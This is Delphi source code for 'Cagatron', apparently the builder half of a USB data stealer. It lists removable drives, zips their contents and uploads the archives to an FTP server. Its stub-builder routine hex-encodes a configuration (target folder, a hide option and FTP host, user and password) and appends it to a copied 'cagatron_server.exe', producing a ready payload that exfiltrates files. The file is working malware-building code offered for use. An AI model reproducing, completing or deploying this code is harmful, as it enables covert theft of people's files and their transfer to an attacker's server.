// Project Cagatron 1.0
// (C) Doddy Hackman 2015
// Based on Ladron by Khronos

unit caga;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, sevenzip, Vcl.ComCtrls, Vcl.StdCtrls,
  ShellApi,
  Vcl.Menus, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  IdExplicitTLSClientServerBase, IdFTP, Vcl.ExtCtrls, Vcl.Imaging.pngimage;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    StatusBar1: TStatusBar;
    PageControl2: TPageControl;
    TabSheet4: TTabSheet;
    usb_found: TListView;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    ftp_host: TEdit;
    Label2: TLabel;
    ftp_user: TEdit;
    Label3: TLabel;
    ftp_pass: TEdit;
    Label4: TLabel;
    ftp_path: TEdit;
    GroupBox2: TGroupBox;
    enter_usb: TEdit;
    Button1: TButton;
    Button2: TButton;
    GroupBox3: TGroupBox;
    upload_ftp_server: TRadioButton;
    TabSheet7: TTabSheet;
    GroupBox4: TGroupBox;
    console: TMemo;
    TabSheet8: TTabSheet;
    only_logs: TRadioButton;
    logs: TListView;
    rutas: TListBox;
    menu: TPopupMenu;
    L1: TMenuItem;
    IdFTP1: TIdFTP;
    buscar_usb: TTimer;
    otromenu: TPopupMenu;
    S1: TMenuItem;
    opcion_text: TEdit;
    PageControl3: TPageControl;
    TabSheet9: TTabSheet;
    TabSheet10: TTabSheet;
    GroupBox5: TGroupBox;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    ftp_host2: TEdit;
    ftp_user2: TEdit;
    ftp_pass2: TEdit;
    ftp_path2: TEdit;
    GroupBox7: TGroupBox;
    directorios: TComboBox;
    GroupBox6: TGroupBox;
    foldername: TEdit;
    Button3: TButton;
    GroupBox8: TGroupBox;
    Image1: TImage;
    Label9: TLabel;
    Image2: TImage;
    GroupBox9: TGroupBox;
    hide_file: TCheckBox;
    upload_ftp: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure list_files;
    procedure L1Click(Sender: TObject);
    procedure buscar_usbTimer(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function usb_name(checked: Char): string;
// Based on http://delphitutorial.info/get-volume-name.html
var
  uno, dos: DWORD;
  resultnow: array [0 .. MAX_PATH] of Char;
begin
  try
    GetVolumeInformation(PChar(checked + ':/'), resultnow, sizeof(resultnow),
      nil, uno, dos, nil, 0);
    Result := StrPas(resultnow);
  except
    Result := checked;
  end;
end;

function check_drive(target: string): boolean;
var
  a, b, c: cardinal;
begin
  Result := GetVolumeInformation(PChar(target), nil, 0, @c, a, b, nil, 0);
end;

function file_size(target: String): integer;
var
  busqueda: TSearchRec;
begin
  Result := 0;
  try
    begin
      if FindFirst(target + '\*.*', faAnyFile + faDirectory + faReadOnly,
        busqueda) = 0 then
      begin
        repeat
          Inc(Result);
        until FindNext(busqueda) <> 0;
        System.SysUtils.FindClose(busqueda);
      end;
    end;
  except
    Result := 0;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  if not DirectoryExists('logs') then
  begin
    CreateDir('logs');
  end;
  Chdir('logs');
  list_files;
end;

procedure TForm1.L1Click(Sender: TObject);
begin
  ShellExecute(0, nil, PChar(rutas.Items[logs.Selected.Index]), nil, nil,
    SW_SHOWNORMAL);
end;

procedure TForm1.list_files;
var
  search: TSearchRec;
  ext: string;
  fecha1: integer;
begin

  logs.Items.Clear();
  rutas.Items.Clear();

  FindFirst(ExtractFilePath(Application.ExeName) + 'logs' + '\*.*',
    faAnyFile, search);
  while FindNext(search) = 0 do
  begin
    ext := ExtractFileExt(search.Name);
    if (ext = '.zip') then
    begin
      with logs.Items.Add do
      begin
        fecha1 := FileAge(ExtractFilePath(Application.ExeName) + 'logs/' +
          search.Name);
        rutas.Items.Add(ExtractFilePath(Application.ExeName) + 'logs/' +
          search.Name);
        Caption := search.Name;
        SubItems.Add(DateToStr(FileDateToDateTime(fecha1)));
      end;
    end;
  end;
  FindClose(search);
end;

procedure TForm1.S1Click(Sender: TObject);
begin
  opcion_text.Text := usb_found.Selected.Caption;
  enter_usb.Text := usb_found.Selected.SubItems[1];
end;

procedure TForm1.buscar_usbTimer(Sender: TObject);
var
  unidad: Char;
begin
  usb_found.Items.Clear();
  for unidad := 'C' to 'Z' do
  begin
    if (check_drive(PChar(unidad + ':\')) = True) and
      (GetDriveType(PChar(unidad + ':\')) = DRIVE_REMOVABLE) then
    begin
      with usb_found.Items.Add do
      begin
        Caption := usb_name(unidad);
        SubItems.Add(IntToStr(file_size(unidad + ':\')));
        SubItems.Add(unidad + ':\');
      end;
    end;
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  with TFileOpenDialog.Create(nil) do
    try
      Options := [fdoPickFolders];
      if Execute then
        enter_usb.Text := Filename;
    finally
      Free;
    end;
end;

procedure TForm1.Button2Click(Sender: TObject);
var
  zipnow: I7zOutArchive;
  busqueda: TSearchRec;
  code: string;
  dirnow: string;
  guardar: string;

begin

  dirnow := enter_usb.Text;

  if not FileExists(PChar(ExtractFilePath(Application.ExeName) + '/' + '7z.dll'))
  then
  begin
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/7z.dll'),
      PChar(ExtractFilePath(Application.ExeName) + '/' + '7z.dll'), True);
  end;

  if not(opcion_text.Text = '') then
  begin
    guardar := opcion_text.Text + '.zip';
  end
  else
  begin
    guardar := ExtractFileName(dirnow) + '.zip';
  end;

  StatusBar1.Panels[0].Text := '[+] Saving ...';
  Form1.StatusBar1.Update;

  console.Lines.Add('[+] Saving ..');

  zipnow := CreateOutArchive(CLSID_CFormat7z);
  SetCompressionLevel(zipnow, 9);
  SevenZipSetCompressionMethod(zipnow, m7LZMA);

  if FindFirst(dirnow + '\*.*', faAnyFile + faDirectory + faReadOnly,
    busqueda) = 0 then
  begin
    repeat
      if (busqueda.Attr = faDirectory) then
      begin
        if not(busqueda.Name = '.') and not(busqueda.Name = '..') then
        begin
          console.Lines.Add('[+] Saving Directory : ' + busqueda.Name);
          // StatusBar1.Panels[0].Text := '[+] Saving Directory : ' + busqueda.Name;
          // Form1.StatusBar1.Update;
          zipnow.AddFiles(dirnow + '/' + busqueda.Name, busqueda.Name,
            '*.*', True);
        end;
      end
      else
      begin
        console.Lines.Add('[+] Saving File : ' + busqueda.Name);
        // StatusBar1.Panels[0].Text := '[+] Saving File : ' + busqueda.Name;
        // Form1.StatusBar1.Update;
        zipnow.AddFile(dirnow + '/' + busqueda.Name, busqueda.Name);
      end;
    until FindNext(busqueda) <> 0;
    System.SysUtils.FindClose(busqueda);
  end;

  zipnow.SaveToFile(guardar);

  if (upload_ftp_server.checked) then
  begin
    IdFTP1.Host := ftp_host.Text;
    IdFTP1.Username := ftp_user.Text;
    IdFTP1.Password := ftp_pass.Text;
    try
      IdFTP1.Connect;
    except
      StatusBar1.Panels[0].Text := '[-] Error Uploading';
      Form1.StatusBar1.Update;
    end;

    StatusBar1.Panels[0].Text := '[+] Uploading ...';
    Form1.StatusBar1.Update;

    IdFTP1.ChangeDir(ftp_path.Text);
    IdFTP1.Put(guardar, guardar, False);
  end;

  list_files;

  console.Lines.Add('[+] Ready');

  StatusBar1.Panels[0].Text := '[+] Ready';
  Form1.StatusBar1.Update;

  opcion_text.Text := '';

end;

procedure TForm1.Button3Click(Sender: TObject);
var
  lineafinal: string;
  hidefile: string;
  uploadftp: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  stubgenerado: string;

begin

  if (hide_file.checked) then
  begin
    hidefile := '1';
  end
  else
  begin
    hidefile := '0';
  end;

  if (upload_ftp.checked) then
  begin
    uploadftp := '1';
  end
  else
  begin
    uploadftp := '0';
  end;

  lineafinal := '[63686175]' + dhencode('[online]1[online]' + '[directorios]' +
    directorios.Text + '[directorios]' + '[carpeta]' + foldername.Text +
    '[carpeta]' + '[ocultar]' + hidefile + '[ocultar]' + '[ftp_op]' + uploadftp
    + '[ftp_op]' + '[ftp_host]' + ftp_host.Text + '[ftp_host]' + '[ftp_user]' +
    ftp_user.Text + '[ftp_user]' + '[ftp_pass]' + ftp_pass.Text + '[ftp_pass]' +
    '[ftp_path]' + ftp_path.Text + '[ftp_path]', 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  stubgenerado := 'cagatron_ready.exe';

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' +
    'Data/cagatron_server.exe'), PChar(ExtractFilePath(Application.ExeName) +
    '/' + stubgenerado), True);

  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/7z.dll'),
    PChar(ExtractFilePath(Application.ExeName) + '/' + '7z.dll'), True);

  StrCopy(code, PChar(lineafinal));
  aca := CreateFile(PChar(ExtractFilePath(Application.ExeName) +
    '/cagatron_ready.exe'), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  StatusBar1.Panels[0].Text := '[+] Done';
  Form1.StatusBar1.Update;

end;

end.

// The End ?
